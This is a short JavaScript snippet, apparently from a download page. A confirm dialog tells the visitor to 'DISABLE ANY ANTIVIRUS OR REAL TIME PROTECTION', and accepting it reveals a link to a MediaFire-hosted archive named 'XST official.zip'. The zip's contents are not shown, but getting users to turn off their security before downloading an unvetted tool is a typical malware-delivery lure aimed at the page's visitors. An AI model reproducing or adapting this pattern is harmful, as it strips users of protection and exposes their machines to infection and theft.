function showDownloadLink() {
    var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
    
    if (confirmDownload) {
        document.getElementById('downloadLink').style.display = 'block';
        document.getElementById('downloadLink').innerHTML = 'Download tool now<a href="https://download1531.mediafire.com/mrcpb9fmx0ugf4RDkrCEgoomUa4tB3HmHiE8Fq5uE93yir4YhOdkN6D2ZpPaxKFfNwPQwW5XUeKVUHZxp8VdO6hfrm44wK6od1s9WAP5xUiq4bC0ap2q2reaOojQqx8rCtAfdUcsAUHFxZNFgHCjOKNBgoE7KbiKbB36saix17qv9A/w6342v3tgerxdba/XST+official.zip">here</a>.';
    }
}
